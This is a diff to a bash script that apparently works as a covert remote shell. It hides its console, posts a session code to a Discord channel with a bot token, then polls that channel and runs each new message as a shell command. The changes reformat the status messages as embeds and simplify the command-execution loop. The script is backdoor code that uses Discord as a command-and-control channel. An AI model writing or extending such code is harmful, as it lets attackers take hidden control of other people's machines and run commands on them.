@@ -42,7 +42,16 @@ Authenticate() {
     if [[ "$command_result" == *"$password"* ]]; then
         authenticated=1
         cwd=$(pwd)
-        json_payload="{\"content\": \":white_check_mark:   **Session Connected**   :white_check_mark: \n\`PS: $cwd >\`\"}"
+        json_payload="{
+          \"content\": \"\",
+          \"embeds\": [
+            {
+              \"title\": \":white_check_mark:   **Session Connected**   :white_check_mark:\",
+              \"description\": \"\`PS: $cwd >\`\",
+              \"color\": 16777215
+            }
+          ]
+        }"        
         curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
     else
         authenticated=0
@@ -184,7 +193,17 @@ random_letters=$(generate_random_letters)
 password="${password}${random_letters}"
 last_command_file=$(mktemp)
 HideConsole
-json_payload="{\"content\": \":hourglass:   **Session Waiting**  |  Connect Code :  \`$password \`  :hourglass:\"}"
+
+json_payload="{
+  \"content\": \"\",
+  \"embeds\": [
+    {
+      \"title\": \":hourglass: Session Waiting :hourglass:\",
+      \"description\": \"**Session Code** : \`$password\`\",
+      \"color\": 16777215
+    }
+  ]
+}"
 curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
 
 while true; do
@@ -193,16 +212,10 @@ while true; do
         if [[ "$recent_message" =~ ^cd\  ]]; then
             cd_command=$(echo "$recent_message" | awk '{print $2}')
             cd "$cd_command"
-            while true; do
-                recent_message=$(get_recent_message)
-                if [[ ! -z $recent_message && $recent_message != $(cat $last_command_file 2>/dev/null) ]]; then
-                    execute_command "$recent_message"
-                    echo "$recent_message" > $last_command_file
-                fi
-                sleep 5
-            done
+            execute_command "pwd"  # Test if cd was successful
+        else
+            execute_command "$recent_message"
         fi
-        execute_command "$recent_message"
         echo "$recent_message" > $last_command_file
     fi
     sleep 5
